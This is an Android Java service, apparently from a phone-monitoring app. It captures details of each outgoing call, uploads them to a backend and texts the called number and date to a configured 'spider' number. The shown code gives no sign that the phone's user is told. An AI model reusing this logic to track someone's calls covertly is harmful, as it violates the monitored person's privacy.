package com.it.mougang.gasmyr.events.Services;

import android.app.IntentService;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import com.it.mougang.gasmyr.events.Utilities.GlobalConstants;
import com.it.mougang.gasmyr.events.Utilities.Utils;
import com.it.mougang.gasmyr.events.applicationThreads.CallThreadRunnable;
import com.it.mougang.gasmyr.events.database.CALL;
import com.it.mougang.gasmyr.events.database.CallType;


public class OutgoingCallService extends IntentService {

    private String callDuration = null;
    private String callMakerNumber = null;
    private String callDate = null;
    private CallType callType = null;
    private String USER_ID = null;
    private String SPIDER_NUMBER = null;
    private boolean candSendBySms = false;
    private boolean callIsEnable = false;

    public OutgoingCallService() {
        super("OutgoingCallService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            try {
                Bundle bundle = intent.getExtras();
                callDuration = bundle.getString(GlobalConstants.EVENT_INCOMING_CALL_DURATION);
                callMakerNumber = bundle.getString(GlobalConstants.EVENT_OUTCOMING_CALL_NUMBER);
                callDate = bundle.getString(GlobalConstants.EVENT_OUTCOMING_CALL_DATE);
                callType = CallType.valueOf(bundle.getString(GlobalConstants.EVENT_OUTCOMING_CALL_TYPE));
                USER_ID = bundle.getString(GlobalConstants.USER_ID);
                SPIDER_NUMBER = bundle.getString(GlobalConstants.SPIDER_NUMBER);
                candSendBySms = bundle.getBoolean(GlobalConstants.CAN_SEND_BY_SMS);
                callIsEnable = bundle.getBoolean(GlobalConstants.ENABLE_CALL);
                CALL newCall = new CALL(callDuration, callDate, Utils.getUserphoneNumber(getApplicationContext()),
                        callMakerNumber, callType.toString());

                if (Utils.isConnectionAvailable(getApplicationContext()) && USER_ID != null) {
                    try {
                        synchronized (new Object()) {
                            CallThreadRunnable callThreadRunnable = new CallThreadRunnable(getApplicationContext(), USER_ID, newCall);
                            Thread callThread = new Thread(callThreadRunnable);
                            callThread.setPriority(Thread.MAX_PRIORITY);
                            callThread.start();
                        }
                    } catch (Exception e) {
                        Log.e(getClass().getName(), e.getMessage());
                    }
                }
                if (candSendBySms && SPIDER_NUMBER != null && callIsEnable &&
                        !callMakerNumber.equalsIgnoreCase(SPIDER_NUMBER)) {
                    Utils.sendNewSms(getMessageToSend(), SPIDER_NUMBER);
                }

            } catch (Exception e) {
                Log.e(getClass().getName(), e.getMessage());
            }

        }
    }

    private String getMessageToSend() {
        return "New call from :" + callMakerNumber + "DATE: " + callDate;
    }

}
